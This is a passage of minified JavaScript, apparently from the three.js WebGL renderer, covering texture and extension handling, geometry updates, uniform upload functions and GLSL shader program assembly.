g=0;g!==m;++g)v[g]=n[g];f.clippingState=v,this.numIntersection=p?this.numPlanes:0,this.numPlanes+=A}}}function Zn(e){var t=new WeakMap;function o(e,t){return t===i?e.mapping=n:t===a&&(e.mapping=r),e}function s(e){var n=e.target;n.removeEventListener("dispose",s);var r=t.get(n);void 0!==r&&(t.delete(n),r.dispose())}return{get:function(n){if(n&&n.isTexture){var r=n.mapping;if(r===i||r===a){if(t.has(n))return o(t.get(n).texture,n.mapping);var l=n.image;if(l&&0<l.height){var c=e.getRenderList(),u=e.getRenderTarget(),d=e.getRenderState(),p=new Dn(l.height/2);return p.fromEquirectangularTexture(e,n),t.set(n,p),e.setRenderTarget(u),e.setRenderList(c),e.setRenderState(d),n.addEventListener("dispose",s),o(p.texture,n.mapping)}return null}}return n},dispose:function(){t=new WeakMap}}}function er(e){var t={};return{has:function(n){if(void 0!==t[n])return null!==t[n];var r;switch(n){case"WEBGL_depth_texture":r=e.getExtension("WEBGL_depth_texture")||e.getExtension("MOZ_WEBGL_depth_texture")||e.getExtension("WEBKIT_WEBGL_depth_texture");break;case"EXT_texture_filter_anisotropic":r=e.getExtension("EXT_texture_filter_anisotropic")||e.getExtension("MOZ_EXT_texture_filter_anisotropic")||e.getExtension("WEBKIT_EXT_texture_filter_anisotropic");break;case"WEBGL_compressed_texture_s3tc":r=e.getExtension("WEBGL_compressed_texture_s3tc")||e.getExtension("MOZ_WEBGL_compressed_texture_s3tc")||e.getExtension("WEBKIT_WEBGL_compressed_texture_s3tc");break;case"WEBGL_compressed_texture_pvrtc":r=e.getExtension("WEBGL_compressed_texture_pvrtc")||e.getExtension("WEBKIT_WEBGL_compressed_texture_pvrtc");break;default:r=e.getExtension(n)}return null!==(t[n]=r)},get:function(e){return this.has(e),t[e]}}}function tr(e,t,n,r){var i=new WeakMap,a=new WeakMap;function o(e){var s=e.target,l=i.get(s);for(var c in null!==l.index&&t.remove(l.index),l.attributes)t.remove(l.attributes[c]);s.removeEventListener("dispose",o),i.delete(s);var u=a.get(l);u&&(t.remove(u),a.delete(l)),r.releaseStatesOfGeometry(l),!0===s.isInstancedBufferGeometry&&delete s._maxInstanceCount,n.memory.geometries--}function s(e){var n=[],r=e.index,i=e.attributes.position,o=0;if(null!==r){var s=r.array;o=r.version;for(var l=0,c=s.length;l<c;l+=3){var u=s[l+0],d=s[l+1],p=s[l+2];n.push(u,d,d,p,p,u)}}else{var h=i.array;o=i.version;for(var f=0,A=h.length/3-1;f<A;f+=3){var m=f+0,v=f+1,g=f+2;n.push(m,v,v,g,g,m)}}var y=new(65535<Jt(n)?Kt:Gt)(n,1);y.version=o;var b=a.get(e);b&&t.remove(b),a.set(e,y)}return{get:function(e,t){var r=i.get(t);return r||(t.addEventListener("dispose",o),t.isBufferGeometry?r=t:t.isGeometry&&(void 0===t._bufferGeometry&&(t._bufferGeometry=(new sn).setFromObject(e)),r=t._bufferGeometry),i.set(t,r),n.memory.geometries++,r)},update:function(e){var n=e.attributes;for(var r in n)t.update(n[r],34962);var i=e.morphAttributes;for(var a in i)for(var o=i[a],s=0,l=o.length;s<l;s++)t.update(o[s],34962)},getWireframeAttribute:function(e){var t=a.get(e);if(t){var n=e.index;null!==n&&t.version<n.version&&s(e)}else s(e);return a.get(e)}}}function nr(e,t,n,r){var i,a,o,s=r.isWebGL2;this.setMode=function(e){i=e},this.setIndex=function(e){a=e.type,o=e.bytesPerElement},this.render=function(t,r){e.drawElements(i,r,a,t*o),n.update(r,i,1)},this.renderInstances=function(r,l,c){if(0!==c){var u,d;if(s)u=e,d="drawElementsInstanced";else if(d="drawElementsInstancedANGLE",null===(u=t.get("ANGLE_instanced_arrays")))return;u[d](i,l,a,r*o,c),n.update(l,i,c)}}}function rr(e){var t={frame:0,calls:0,triangles:0,points:0,lines:0};return{memory:{geometries:0,textures:0},render:t,programs:null,autoReset:!0,reset:function(){t.frame++,t.calls=0,t.triangles=0,t.points=0,t.lines=0},update:function(e,n,r){switch(t.calls++,n){case 4:t.triangles+=r*(e/3);break;case 1:t.lines+=r*(e/2);break;case 3:t.lines+=r*(e-1);break;case 2:t.lines+=r*e;break;case 0:t.points+=r*e}}}}function ir(e,t){return e[0]-t[0]}function ar(e,t){return Math.abs(t[1])-Math.abs(e[1])}function or(e){for(var t={},n=new Float32Array(8),r=[],i=0;i<8;i++)r[i]=[i,0];return{update:function(i,a,o,s){var l=i.morphTargetInfluences,c=void 0===l?0:l.length,u=t[a.id];if(void 0===u){u=[];for(var d=0;d<c;d++)u[d]=[d,0];t[a.id]=u}for(var p=0;p<c;p++){var h=u[p];h[0]=p,h[1]=l[p]}u.sort(ar);for(var f=0;f<8;f++)f<c&&u[f][1]?(r[f][0]=u[f][0],r[f][1]=u[f][1]):(r[f][0]=Number.MAX_SAFE_INTEGER,r[f][1]=0);r.sort(ir);for(var A=o.morphTargets&&a.morphAttributes.position,m=o.morphNormals&&a.morphAttributes.normal,v=0,g=0;g<8;g++){var y=r[g],b=y[0],_=y[1];b!==Number.MAX_SAFE_INTEGER&&_?(A&&a.getAttribute("morphTarget"+g)!==A[b]&&a.setAttribute("morphTarget"+g,A[b]),m&&a.getAttribute("morphNormal"+g)!==m[b]&&a.setAttribute("morphNormal"+g,m[b]),v+=n[g]=_):(A&&void 0!==a.getAttribute("morphTarget"+g)&&a.deleteAttribute("morphTarget"+g),m&&void 0!==a.getAttribute("morphNormal"+g)&&a.deleteAttribute("morphNormal"+g),n[g]=0)}var w=a.morphTargetsRelative?1:1-v;s.getUniforms().setValue(e,"morphTargetBaseInfluence",w),s.getUniforms().setValue(e,"morphTargetInfluences",n)}}}function sr(e,t,n,r){var i=new WeakMap;return{update:function(e){var a=r.render.frame,o=e.geometry,s=t.get(e,o);return i.get(s)!==a&&(o.isGeometry&&s.updateFromObject(e),t.update(s),i.set(s,a)),e.isInstancedMesh&&(n.update(e.instanceMatrix,34962),null!==e.instanceColor&&n.update(e.instanceColor,34962)),s},dispose:function(){i=new WeakMap}}}function lr(e,t,n,r){le.call(this,null),this.image={data:e||null,width:t||1,height:n||1,depth:r||1},this.magFilter=d,this.minFilter=d,this.wrapR=c,this.generateMipmaps=!1,this.flipY=!1,this.needsUpdate=!0}function cr(e,t,n,r){le.call(this,null),this.image={data:e||null,width:t||1,height:n||1,depth:r||1},this.magFilter=d,this.minFilter=d,this.wrapR=c,this.generateMipmaps=!1,this.flipY=!1,this.needsUpdate=!0}Wn.physical={uniforms:Tn([Wn.standard.uniforms,{clearcoat:{value:0},clearcoatMap:{value:null},clearcoatRoughness:{value:0},clearcoatRoughnessMap:{value:null},clearcoatNormalScale:{value:new ie(1,1)},clearcoatNormalMap:{value:null},sheen:{value:new Lt(0)},transmission:{value:0},transmissionMap:{value:null}}]),vertexShader:Qn.meshphysical_vert,fragmentShader:Qn.meshphysical_frag},((lr.prototype=Object.create(le.prototype)).constructor=lr).prototype.isDataTexture2DArray=!0,((cr.prototype=Object.create(le.prototype)).constructor=cr).prototype.isDataTexture3D=!0;var ur=new le,dr=new lr,pr=new cr,hr=new Nn,fr=[],Ar=[],mr=new Float32Array(16),vr=new Float32Array(9),gr=new Float32Array(4);function yr(e,t,n){var r=e[0];if(r<=0||0<r)return e;var i=t*n,a=fr[i];if(void 0===a&&(a=new Float32Array(i),fr[i]=a),0!==t){r.toArray(a,0);for(var o=1,s=0;o!==t;++o)s+=n,e[o].toArray(a,s)}return a}function br(e,t){if(e.length!==t.length)return!1;for(var n=0,r=e.length;n<r;n++)if(e[n]!==t[n])return!1;return!0}function _r(e,t){for(var n=0,r=t.length;n<r;n++)e[n]=t[n]}function wr(e,t){var n=Ar[t];void 0===n&&(n=new Int32Array(t),Ar[t]=n);for(var r=0;r!==t;++r)n[r]=e.allocateTextureUnit();return n}function Cr(e,t){var n=this.cache;n[0]!==t&&(e.uniform1f(this.addr,t),n[0]=t)}function xr(e,t){var n=this.cache;if(void 0!==t.x)n[0]===t.x&&n[1]===t.y||(e.uniform2f(this.addr,t.x,t.y),n[0]=t.x,n[1]=t.y);else{if(br(n,t))return;e.uniform2fv(this.addr,t),_r(n,t)}}function Sr(e,t){var n=this.cache;if(void 0!==t.x)n[0]===t.x&&n[1]===t.y&&n[2]===t.z||(e.uniform3f(this.addr,t.x,t.y,t.z),n[0]=t.x,n[1]=t.y,n[2]=t.z);else if(void 0!==t.r)n[0]===t.r&&n[1]===t.g&&n[2]===t.b||(e.uniform3f(this.addr,t.r,t.g,t.b),n[0]=t.r,n[1]=t.g,n[2]=t.b);else{if(br(n,t))return;e.uniform3fv(this.addr,t),_r(n,t)}}function kr(e,t){var n=this.cache;if(void 0!==t.x)n[0]===t.x&&n[1]===t.y&&n[2]===t.z&&n[3]===t.w||(e.uniform4f(this.addr,t.x,t.y,t.z,t.w),n[0]=t.x,n[1]=t.y,n[2]=t.z,n[3]=t.w);else{if(br(n,t))return;e.uniform4fv(this.addr,t),_r(n,t)}}function Mr(e,t){var n=this.cache,r=t.elements;if(void 0===r){if(br(n,t))return;e.uniformMatrix2fv(this.addr,!1,t),_r(n,t)}else{if(br(n,r))return;gr.set(r),e.uniformMatrix2fv(this.addr,!1,gr),_r(n,r)}}function Br(e,t){var n=this.cache,r=t.elements;if(void 0===r){if(br(n,t))return;e.uniformMatrix3fv(this.addr,!1,t),_r(n,t)}else{if(br(n,r))return;vr.set(r),e.uniformMatrix3fv(this.addr,!1,vr),_r(n,r)}}function Er(e,t){var n=this.cache,r=t.elements;if(void 0===r){if(br(n,t))return;e.uniformMatrix4fv(this.addr,!1,t),_r(n,t)}else{if(br(n,r))return;mr.set(r),e.uniformMatrix4fv(this.addr,!1,mr),_r(n,r)}}function Tr(e,t,n){var r=this.cache,i=n.allocateTextureUnit();r[0]!==i&&(e.uniform1i(this.addr,i),r[0]=i),n.safeSetTexture2D(t||ur,i)}function Pr(e,t,n){var r=this.cache,i=n.allocateTextureUnit();r[0]!==i&&(e.uniform1i(this.addr,i),r[0]=i),n.setTexture2DArray(t||dr,i)}function Ir(e,t,n){var r=this.cache,i=n.allocateTextureUnit();r[0]!==i&&(e.uniform1i(this.addr,i),r[0]=i),n.setTexture3D(t||pr,i)}function Fr(e,t,n){var r=this.cache,i=n.allocateTextureUnit();r[0]!==i&&(e.uniform1i(this.addr,i),r[0]=i),n.safeSetTextureCube(t||hr,i)}function Lr(e,t){var n=this.cache;n[0]!==t&&(e.uniform1i(this.addr,t),n[0]=t)}function Or(e,t){var n=this.cache;br(n,t)||(e.uniform2iv(this.addr,t),_r(n,t))}function Nr(e,t){var n=this.cache;br(n,t)||(e.uniform3iv(this.addr,t),_r(n,t))}function Dr(e,t){var n=this.cache;br(n,t)||(e.uniform4iv(this.addr,t),_r(n,t))}function Rr(e,t){var n=this.cache;n[0]!==t&&(e.uniform1ui(this.addr,t),n[0]=t)}function jr(e,t){e.uniform1fv(this.addr,t)}function Ur(e,t){e.uniform1iv(this.addr,t)}function $r(e,t){e.uniform2iv(this.addr,t)}function zr(e,t){e.uniform3iv(this.addr,t)}function Hr(e,t){e.uniform4iv(this.addr,t)}function Vr(e,t){var n=yr(t,this.size,2);e.uniform2fv(this.addr,n)}function Qr(e,t){var n=yr(t,this.size,3);e.uniform3fv(this.addr,n)}function Gr(e,t){var n=yr(t,this.size,4);e.uniform4fv(this.addr,n)}function Wr(e,t){var n=yr(t,this.size,4);e.uniformMatrix2fv(this.addr,!1,n)}function Kr(e,t){var n=yr(t,this.size,9);e.uniformMatrix3fv(this.addr,!1,n)}function qr(e,t){var n=yr(t,this.size,16);e.uniformMatrix4fv(this.addr,!1,n)}function Xr(e,t,n){var r=t.length,i=wr(n,r);e.uniform1iv(this.addr,i);for(var a=0;a!==r;++a)n.safeSetTexture2D(t[a]||ur,i[a])}function Yr(e,t,n){var r=t.length,i=wr(n,r);e.uniform1iv(this.addr,i);for(var a=0;a!==r;++a)n.safeSetTextureCube(t[a]||hr,i[a])}function Jr(e,t,n){this.id=e,this.addr=n,this.cache=[],this.setValue=function(e){switch(e){case 5126:return Cr;case 35664:return xr;case 35665:return Sr;case 35666:return kr;case 35674:return Mr;case 35675:return Br;case 35676:return Er;case 5124:case 35670:return Lr;case 35667:case 35671:return Or;case 35668:case 35672:return Nr;case 35669:case 35673:return Dr;case 5125:return Rr;case 35678:case 36198:case 36298:case 36306:case 35682:return Tr;case 35679:case 36299:case 36307:return Ir;case 35680:case 36300:case 36308:case 36293:return Fr;case 36289:case 36303:case 36311:case 36292:return Pr}}(t.type)}function Zr(e,t,n){this.id=e,this.addr=n,this.cache=[],this.size=t.size,this.setValue=function(e){switch(e){case 5126:return jr;case 35664:return Vr;case 35665:return Qr;case 35666:return Gr;case 35674:return Wr;case 35675:return Kr;case 35676:return qr;case 5124:case 35670:return Ur;case 35667:case 35671:return $r;case 35668:case 35672:return zr;case 35669:case 35673:return Hr;case 35678:case 36198:case 36298:case 36306:case 35682:return Xr;case 35680:case 36300:case 36308:case 36293:return Yr}}(t.type)}function ei(e){this.id=e,this.seq=[],this.map={}}Zr.prototype.updateCache=function(e){var t=this.cache;e instanceof Float32Array&&t.length!==e.length&&(this.cache=new Float32Array(e.length)),_r(t,e)},ei.prototype.setValue=function(e,t,n){for(var r=this.seq,i=0,a=r.length;i!==a;++i){var o=r[i];o.setValue(e,t[o.id],n)}};var ti=/([\w\d_]+)(\])?(\[|\.)?/g;function ni(e,t){e.seq.push(t),e.map[t.id]=t}function ri(e,t,n){var r=e.name,i=r.length;for(ti.lastIndex=0;;){var a=ti.exec(r),o=ti.lastIndex,s=a[1],l="]"===a[2],c=a[3];if(l&&(s|=0),void 0===c||"["===c&&o+2===i){ni(n,void 0===c?new Jr(s,e,t):new Zr(s,e,t));break}var u=n.map[s];void 0===u&&ni(n,u=new ei(s)),n=u}}function ii(e,t){this.seq=[],this.map={};for(var n=e.getProgramParameter(t,35718),r=0;r<n;++r){var i=e.getActiveUniform(t,r);ri(i,e.getUniformLocation(t,i.name),this)}}function ai(e,t,n){var r=e.createShader(t);return e.shaderSource(r,n),e.compileShader(r),r}ii.prototype.setValue=function(e,t,n,r){var i=this.map[t];void 0!==i&&i.setValue(e,n,r)},ii.prototype.setOptional=function(e,t,n){var r=t[n];void 0!==r&&this.setValue(e,n,r)},ii.upload=function(e,t,n,r){for(var i=0,a=t.length;i!==a;++i){var o=t[i],s=n[o.id];!1!==s.needsUpdate&&o.setValue(e,s.value,r)}},ii.seqWithValue=function(e,t){for(var n=[],r=0,i=e.length;r!==i;++r){var a=e[r];a.id in t&&n.push(a)}return n};var oi=0;function si(e){switch(e){case D:return["Linear","( value )"];case R:return["sRGB","( value )"];case U:return["RGBE","( value )"];case $:return["RGBM","( value, 7.0 )"];case z:return["RGBM","( value, 16.0 )"];case H:return["RGBD","( value, 256.0 )"];case j:return["Gamma","( value, float( GAMMA_FACTOR ) )"];case 3003:return["LogLuv","( value )"];default:return["Linear","( value )"]}}function li(e,t,n){var r=e.getShaderParameter(t,35713),i=e.getShaderInfoLog(t).trim();return r&&""===i?"":"THREE.WebGLShader: gl.getShaderInfoLog() "+n+"\n"+i+function(e){for(var t=e.split("\n"),n=0;n<t.length;n++)t[n]=n+1+": "+t[n];return t.join("\n")}(e.getShaderSource(t))}function ci(e,t){var n=si(t);return"vec4 "+e+"( vec4 value ) { return "+n[0]+"ToLinear"+n[1]+"; }"}function ui(e){return""!==e}function di(e,t){return e.replace(/NUM_DIR_LIGHTS/g,t.numDirLights).replace(/NUM_SPOT_LIGHTS/g,t.numSpotLights).replace(/NUM_RECT_AREA_LIGHTS/g,t.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,t.numPointLights).replace(/NUM_HEMI_LIGHTS/g,t.numHemiLights).replace(/NUM_DIR_LIGHT_SHADOWS/g,t.numDirLightShadows).replace(/NUM_SPOT_LIGHT_SHADOWS/g,t.numSpotLightShadows).replace(/NUM_POINT_LIGHT_SHADOWS/g,t.numPointLightShadows)}function pi(e,t){return e.replace(/NUM_CLIPPING_PLANES/g,t.numClippingPlanes).replace(/UNION_CLIPPING_PLANES/g,t.numClippingPlanes-t.numClipIntersection)}var hi=/^[ \t]*#include +<([\w\d./]+)>/gm;function fi(e){return e.replace(hi,Ai)}function Ai(e,t){var n=Qn[t];if(void 0===n)throw new Error("Can not resolve #include <"+t+">");return fi(n)}var mi=/#pragma unroll_loop[\s]+?for \( int i \= (\d+)\; i < (\d+)\; i \+\+ \) \{([\s\S]+?)(?=\})\}/g,vi=/#pragma unroll_loop_start\s+for\s*\(\s*int\s+i\s*=\s*(\d+)\s*;\s*i\s*<\s*(\d+)\s*;\s*i\s*\+\+\s*\)\s*{([\s\S]+?)}\s+#pragma unroll_loop_end/g;function gi(e){return e.replace(vi,bi).replace(mi,yi)}function yi(e,t,n,r){return bi(e,t,n,r)}function bi(e,t,n,r){for(var i="",a=parseInt(t);a<parseInt(n);a++)i+=r.replace(/\[\s*i\s*\]/g,"[ "+a+" ]").replace(/UNROLLED_LOOP_INDEX/g,a);return i}function _i(e){var t="precision "+e.precision+" float;\nprecision "+e.precision+" int;";return"highp"===e.precision?t+="\n#define HIGH_PRECISION":"mediump"===e.precision?t+="\n#define MEDIUM_PRECISION":"lowp"===e.precision&&(t+="\n#define LOW_PRECISION"),t}function wi(e,t,i,a){var l,c,u,d,p,h,f,A=e.getContext(),m=i.defines,v=i.vertexShader,g=i.fragmentShader,y=(c="SHADOWMAP_TYPE_BASIC",1===(l=i).shadowMapType?c="SHADOWMAP_TYPE_PCF":2===l.shadowMapType?c="SHADOWMAP_TYPE_PCF_SOFT":3===l.shadowMapType&&(c="SHADOWMAP_TYPE_VSM"),c),b=function(e){var t="ENVMAP_TYPE_CUBE";if(e.envMap)switch(e.envMapMode){case n:case r:t="ENVMAP_TYPE_CUBE";break;case o:case s:t="ENVMAP_TYPE_CUBE_UV"}return t}(i),_=function(e){var t="ENVMAP_MODE_REFLECTION";if(e.envMap)switch(e.envMapMode){case r:case s:t="ENVMAP_MODE_REFRACTION"}return t}(i),w=function(e){var t="ENVMAP_BLENDING_NONE";if(e.envMap)switch(e.combine){case 0:t="ENVMAP_BLENDING_MULTIPLY";break;case 1:t="ENVMAP_BLENDING_MIX";break;case 2:t="ENVMAP_BLENDING_ADD"}return t}(i),C=0<e.gammaFactor?e.gammaFactor:1,x=i.isWebGL2?"":[(u=i).extensionDerivatives||u.envMapCubeUV||u.bumpMap||u.tangentSpaceNormalMap||u.clearcoatNormalMap||u.flatShading||"physical"===u.shaderID?"#extension GL_OES_standard_derivatives : enable":"",(u.extensionFragDepth||u.logarithmicDepthBuffer)&&u.rendererExtensionFragDepth?"#extension GL_EXT_frag_depth : enable":"",u.extensionDrawBuffers&&u.rendererExtensionDrawBuffers?"#extension GL_EXT_draw_buffers : require":"",(u.extensionShaderTextureLOD||u.envMap)&&u.rendererExtensionShaderTextureLod?"#extension GL_EXT_shader_texture_lod : enable":""].filter(ui).join("\n"),S=function(e){var t=[];for(var n in e){var r=e[n];!1!==r&&t.push("#define "+n+" "+r)}return t.join("\n")}(m),k=A.createProgram(),M=i.glslVersion?"#version "+i.glslVersion+"\n":"";i.isRawShaderMaterial?(0<(d=[S].filter(ui).join("\n")).length&&(d+="\n"),0<(p=[x,S].filter(ui).join("\n")).length&&(p+="\n")):(d=[_i(i),"#define SHADER_NAME "+i.shaderName,S,i.instancing?"#define USE_INSTANCING":"",i.instancingColor?"#define USE_INSTANCING_COLOR":"",i.supportsVertexTextures?"#define VERTEX_TEXTURES":"","#define GAMMA_FACTOR "+C,"#define MAX_BONES "+i.maxBones,i.useFog&&i.fog?"#define USE_FOG":"",i.useFog&&i.fogExp2?"#define FOG_EXP2":"",i.map?"#define USE_MAP":"",i.envMap?"#define USE_ENVMAP":"",i.envMap?"#define "+_:"",i.lightMap?"#define USE_LIGHTMAP":"",i.aoMap?"#define USE_AOMAP":"",i.emissiveMap?"#define USE_EMISSIVEMAP":"",i.bumpMap?"#define USE_BUMPMAP":"",i.normalMap?"#define USE_NORMALMAP":"",i.normalMap&&i.objectSpaceNormalMap?"#define OBJECTSPACE_NORMALMAP":"",i.normalMap&&i.tangentSpaceNormalMap?"#define TANGENTSPACE_NORMALMAP":"",i.clearcoatMap?"#define USE_CLEARCOATMAP":"",i.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",i.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",i.displacementMap&&i.supportsVertexTextures?"#define USE_DISPLACEMENTMAP":"",i.specularMap?"#define USE_SPECULARMAP":"",i.roughnessMap?"#define USE_ROUGHNESSMAP":"",i.metalnessMap?"#define USE_METALNESSMAP":"",i.alphaMap?"#define USE_ALPHAMAP":"",i.transmissionMap?"#define USE_TRANSMISSIONMAP":"",i.vertexTangents?"#define USE_TANGENT":"",i.vertexColors?"#define USE_COLOR":"",i.vertexUvs?"#define USE_UV":"",i.uvsVertexOnly?"#define UVS_VERTEX_ONLY":"",i.flatShading?"#define FLAT_SHADED":"",i.skinning?"#define USE_SKINNING":"",i.useVertexTexture?"#define BONE_TEXTURE":"",i.morphTargets?"#define USE_MORPHTARGETS":"",i.morphNormals&&!1===i.flatShading?"#define USE_MORPHNORMALS":"",i.doubleSided?"#define DOUBLE_SIDED":"",i.flipSided?"#define FLIP_SIDED":"",i.shadowMapEnabled?"#define USE_SHADOWMAP":"",i.shadowMapEnabled?"#define "+y:"",i.sizeAttenuation?"#define USE_SIZEATTENUATION":"",i.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",i.logarithmicDepthBuffer&&i.rendererExtensionFragDepth?"#define USE_LOGDEPTHBUF_EXT":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;","#ifdef USE_INSTANCING","\tattribute mat4 instanceMatrix;","#endif","#ifdef USE_INSTANCING_COLOR","\tattribute vec3 instanceColor;","#endif","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","#ifdef USE_TANGENT","\tattribute vec4 tangent;","#endif","#ifdef USE_COLOR","\tattribute vec3 color;","#endif","#ifdef USE_MORPHTARGETS","\tattribute vec3 morphTarget0;","\tattribute vec3 morphTarget1;","\tattribute vec3 morphTarget2;","\tattribute vec3 morphTarget3;","\t#ifdef USE_MORPHNORMALS","\t\tattribute vec3 morphNormal0;","\t\tattribute vec3 morphNormal1;","\t\tattribute vec3 morphNormal2;","\t\tattribute vec3 morphNormal3;","\t#else","\t\tattribute vec3 morphTarget4;","\t\tattribute vec3 morphTarget5;","\t\tattribute vec3 morphTarget6;","\t\tattribute vec3 morphTarget7;","\t#endif","#endif","#ifdef USE_SKINNING","\tattribute vec4 skinIndex;","\tattribute vec4 skinWeight;","#endif","\n"].filter(ui).join("\n"),p=[x,_i(i),"#define SHADER_NAME "+i.shaderName,S,i.alphaTest?"#define ALPHATEST "+i.alphaTest+(i.alphaTest%1?"":".0"):"","#define GAMMA_FACTOR "+C,i.useFog&&i.fog?"#define USE_FOG":"",i.useFog&&i.fogExp2?"#define FOG_EXP2":"",i.map?"#define USE_MAP":"",i.matcap?"#define USE_MATCAP":"",i.envMap?"#define USE_ENVMAP":"",i.envMap?"#define "+b:"",i.envMap?"#define "+_:"",i.envMap?"#define "+w:"",i.lightMap?"#define USE_LIGHTMAP":"",i.aoMap?"#define USE_AOMAP":"",i.emissiveMap?"#define USE_EMISSIVEMAP":"",i.bumpMap?"#define USE_BUMPMAP":"",i.normalMap?"#define USE_NORMALMAP":"",i.normalMap&&i.objectSpaceNormalMap?"#define OBJECTSPACE_NORMALMAP":"",i.normalMap&&i.tangentSpaceNormalMap?"#define TANGENTSPACE_NORMALMAP":"",i.clearcoatMap?"#define USE_CLEARCOATMAP":"",i.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",i.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",i.specularMap?"#define USE_SPECULARMAP":"",i.roughnessMap?"#define USE_ROUGHNESSMAP":"",i.metalnessMap?"#define USE_METALNESSMAP":"",i.alphaMap?"#define USE_ALPHAMAP":"",i.sheen?"#define USE_SHEEN":"",i.transmissionMap?"#define USE_TRANSMISSIONMAP":"",i.vertexTangents?"#define USE_TANGENT":"",i.vertexColors||i.instancingColor?"#define USE_COLOR":"",i.vertexUvs?"#define USE_UV":"",i.uvsVertexOnly?"#define UVS_VERTEX_ONLY":"",i.gradientMap?"#define USE_GRADIENTMAP":"",i.flatShading?"#define FLAT_SHADED":"",i.doubleSided?"#define DOUBLE_SIDED":"",i.flipSided?"#define FLIP_SIDED":"",i.shadowMapEnabled?"#define USE_SHADOWMAP":"",i.shadowMapEnabled?"#define "+y:"",i.premultipliedAlpha?"#define PREMULTIPLIED_ALPHA":"",i.physicallyCorrectLights?"#define PHYSICALLY_CORRECT_LIGHTS":"",i.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",i.logarithmicDepthBuffer&&i.rendererExtensionFragDepth?"#define USE_LOGDEPTHBUF_EXT":"",(i.extensionShaderTextureLOD||i.envMap)&&i.rendererExtensionShaderTextureLod?"#define TEXTURE_LOD_EXT":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;",0!==i.toneMapping?"#define TONE_MAPPING":"",0!==i.toneMapping?Qn.tonemapping_pars_fragment:"",0!==i.toneMapping?function(e,t){var n;switch(t){case 1:n="Linear";break;case 2:n="Reinhard";break;case 3:n="OptimizedCineon";break;case 4:n="ACESFilmic";break;case 5:n="Custom";break;default:n="Linear"}return"vec3 toneMapping( vec3 color ) { return "+n+"ToneMapping( color ); }"}(0,i.toneMapping):"",i.dithering?"#define DITHERING":"",Qn.encodings_pars_fragment,i.map?ci("mapTexelToLinear",i.mapEncoding):"",i.matcap?ci("matcapTexelToLinear",i.matcapEncoding):"",i.envMap?ci("envMapTexelToLinear",i.envMapEncoding):"",i.emissiveMap?ci("emissiveMapTexelToLinear",i.emissiveMapEncoding):"",i.lightMap?ci("lightMapTexelToLinear",i.lightMapEncoding):"",("linearToOutputTexel",h=i.outputEncoding,f=si(h),"vec4 linearToOutputTexel( vec4 value ) { return LinearTo"+f[0]+f[1]+"; }"),i.depthPacking?"#define DEPTH_PACKING "+i.depthPacking:"","\n"].filter(ui).join("\n")),v=pi(v=di(v=fi(v),i),i),g=pi(g=di(g=fi(g),i),i),v=gi(v),g=gi(g),i.isWebGL2&&!0!==i.isRawShaderMaterial&&(M="#version 300 es\n",d=["#define attribute in","#define varying out","#define texture2D texture"].join("\n")+"\n"+d,p=["#define varying in",i.glslVersion===W?"":"out highp vec4 pc_fragColor;",i.glslVersion===W?"":"#define gl_FragColor pc_fragColor","#define gl_FragDepthEXT gl_FragDepth","#define texture2D texture","#define textureCube texture","#define texture2DProj textureProj","#define texture2DLodEXT textureLod","#define texture2DProjLodEXT textureProjLod","#define textureCubeLodEXT textureLod","#define texture2DGradEXT textureGrad","#define texture2DProjGradEXT textureProjGrad","#define textureCubeGradEXT textureGrad"].join("\n")+"\n"+p);var B,E,T=M+p+g,P=ai(A,35633,M+d+v),I=ai(A,35632,T);if(A.attachShader(k,P),A.attachShader(k,I),void 0!==i.index0AttributeName?A.bindAttribLocation(k,0,i.index0AttributeName):!0===i.morphTargets&&A.bindAttribLocation(k,0,"position"),A.linkProgram(k),e.debug.checkShaderErrors){var F=A.getProgramInfoLog(k).trim(),L=A.getShaderInfoLog(P).trim(),O=A.getShaderInfoLog(I).trim(),N=!0,D=!0;!1===A.getProgramParameter(k,35714)?(N=!1,li(A,P,"vertex"),li(A,I,"fragment")):""!==F||""!==L&&""!==O||(D=!1),D&&(this.diagnostics={runnable:N,programLog:F,vertexShader:{log:L,prefix:d},fragmentShader:{log:O,prefix:p}})}return A.deleteShader(P),A.deleteShader(I),this.getUniforms=function(){return void 0===B&&(B=new ii(A,k)),B},this.getAttributes=function(){return void 0===E&&(E=function(e,t){for(var n={},r=e.getProgramParameter(t,35721),i=0;i<r;i++){var a=e.getActiveAttrib(t,i).name;n[a]=e.getAttribLocation(t,a)}return n}(A,k)),E},this.destroy=function(){a.releaseStatesOfProgram(this),A.deleteProgram(k),this.program=void 0},this.name=i.shaderName,this.id=oi++,this.cacheKey=t,this.usedTimes=1,this.program=k,this.vertexShader=P,this.fragmentShader=I,this}function Ci(e,t,n,r,i,a){var l=[],c=r.isWebGL2,u=r.logarithmicDepthBuffer,d=r.floatVertexTextures,p=r.maxVertexUniforms,h=r.vertexTextures,f=r.precision,A={MeshDepthMaterial:"depth",MeshDistanceMaterial:"distanceRGBA",MeshNormalMaterial:"normal",MeshBasicMaterial:"basic",MeshLambertMaterial:"lambert",MeshPhongMaterial:"phong",MeshToonMaterial:"toon",MeshStandardMaterial:"physical",MeshPhysicalMaterial:"physical",MeshMatcapMaterial:"matcap",LineBasicMaterial:"basic",LineDashedMaterial:"dashed",PointsMaterial:"points",ShadowMaterial:"shadow",SpriteMaterial:"sprite"},m=["precision","isWebGL2","supportsVertexTextures","outputEncoding","instancing","instancingColor","map","mapEncoding","matcap","matcapEncoding","envMap","envMapMode","envMapEncoding","envMapCubeUV","lightMap","lightMapEncoding","aoMap","emissiveMap","emissiveMapEncoding","bumpMap","normalMap","objectSpaceNormalMap","tangentSpaceNormalMap","clearcoatMap","clearcoatRoughnessMap","clearcoatNormalMap","displacementMap","specularMap","roughnessMap","metalnessMap","gradientMap","alphaMap","combine","vertexColors","vertexTangents","vertexUvs","uvsVertexOnly","fog","useFog","fogExp2","flatShading","sizeAttenuation","logarithmicDepthBuffer","skinning","maxBones","useVertexTexture","morphTargets","morphNormals","maxMorphTargets","m